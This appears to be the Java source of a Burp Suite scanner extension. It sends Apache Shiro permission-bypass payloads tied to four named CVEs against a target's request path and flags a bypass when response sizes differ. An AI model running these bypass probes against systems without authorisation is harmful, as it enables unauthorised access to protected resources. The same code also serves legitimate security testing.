package burp.core.scanner.active.shiroscanner;

import burp.*;
import burp.core.scanner.BaseScanner;
import burp.core.scanner.active.IActiveScanner;
import burp.utils.BurpAnalyzedRequest;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

public class ShiroBypassScanner extends BaseScanner implements ActionListener, Runnable, IActiveScanner {
    public ShiroBypassScanner(IBurpExtenderCallbacks callbacks, IHttpRequestResponse httpRequestResponse){
        super("ShiroBypass");
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.burpAnalyzedRequest = new BurpAnalyzedRequest();
        this.httpRequestResponse = httpRequestResponse;
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
    }

    /**
     * Invoked when an action occurs.
     *
     * @param e
     */
    @Override
    public void actionPerformed(ActionEvent e) {
        new Thread(this).start();
    }

    public List<String> getPayload(){
        List<String> payloadList = new ArrayList<>();
        String requestURI = this.burpAnalyzedRequest.getRequestURI(this.httpRequestResponse);
        // CVE_2016_6802
        String CVE_2016_6802 = new CVE_2016_6802(requestURI).getExp();
        // CVE_2020_1957
        String CVE_2020_1957 = new CVE_2020_1957(requestURI).getExp();
        // CVE-2020-11989 基于ContextPath，这里的Context就为第一层目录
        String CVE_2020_11989 = new CVE_2020_11989(requestURI).getExp();
        // CVE-2020-13933
        String CVE_2020_13933 = new CVE_2020_13933(requestURI).getExp();
        // PUT
        payloadList.add(CVE_2016_6802);
        payloadList.add(CVE_2020_1957);
        payloadList.add(CVE_2020_11989);
        payloadList.add(CVE_2020_13933);

        return payloadList;
    }

    public List<IHttpRequestResponse> sendPayload()  {
        List<String> payloadList = this.getPayload();
        List<IHttpRequestResponse> responseList = new ArrayList<>();
        IRequestInfo RequestInfo = this.helpers.analyzeRequest(this.httpRequestResponse);
        List<String> headers = RequestInfo.getHeaders();
        for (String payload : payloadList) {
            for (int i=0; i<headers.size(); i++) {
                String s = headers.get(i);
                if (s.contains("HTTP/1.1")){
                    String s1 = s.replaceFirst("\\s(.*)\\s", " " + payload + " ");
                    headers.set(i, s1);
                    break;
                }
            }
            byte[] requestBytes = this.helpers.buildHttpMessage(headers, burpAnalyzedRequest.getRequestBody(this.httpRequestResponse));
            IHttpRequestResponse response = this.callbacks.makeHttpRequest(this.httpRequestResponse.getHttpService(), requestBytes);
            responseList.add(response);
        }

        return responseList;
    }

    /**
     * When an object implementing interface <code>Runnable</code> is used
     * to create a thread, starting the thread causes the object's
     * <code>run</code> method to be called in that separately executing
     * thread.
     * <p>
     * The general contract of the method <code>run</code> is that it may
     * take any action whatsoever.
     *
     * @see Thread#run()
     */
    @Override
    public void run() {
        List<IHttpRequestResponse> responseList = null;

        try {
            responseList = this.sendPayload(); // 发送payload
        }catch (Exception e){
            e.printStackTrace();
        }

        if (responseList == null){
            return;
        }

        for (IHttpRequestResponse response : responseList) {
            // 默认添加请求包
            int tagId = BurpExtender.tags.add(
                    this.getScannerName(),
                    this.burpAnalyzedRequest.getRequestDomain(response),
                    this.burpAnalyzedRequest.getStatusCode(response)+"",
                    "[-] waiting for results",
                    this.httpRequestResponse
            );

            // 这里根据size的不同来进行判断漏洞的存在性
            int responseSize = burpAnalyzedRequest.getResponseBodySize(response);
            if ((responseSize != 0
                    || (this.burpAnalyzedRequest.getStatusCode(response) == 302))
                    && (this.burpAnalyzedRequest.getStatusCode(response) != 404)
            ){
                // 正常的请求如下走法：
                int baseResponseSize = burpAnalyzedRequest.getResponseBodySize(this.httpRequestResponse);
                if (responseSize != baseResponseSize){
                    BurpExtender.tags.update(
                            tagId,
                            this.getScannerName(),
                            this.burpAnalyzedRequest.getRequestDomain(response),
                            this.burpAnalyzedRequest.getStatusCode(response)+"",
                            "[+] found shiro permission bypass",
                            response
                    );
                }else{
                    BurpExtender.tags.update(
                            tagId,
                            this.getScannerName(),
                            this.burpAnalyzedRequest.getRequestDomain(response),
                            burpAnalyzedRequest.getStatusCode(response)+"",
                            "[-] not found shiro permission bypass",
                            response
                    );
                }
            }else{
                // 不正常的请求如下走法：
                BurpExtender.tags.update(
                        tagId,
                        this.getScannerName(),
                        this.burpAnalyzedRequest.getRequestDomain(response),
                        this.helpers.analyzeResponse(response.getResponse()).getStatusCode() + "",
                        "[-] shiroScan Something Wrong",
                        response
                );
            }
        }
    }
}
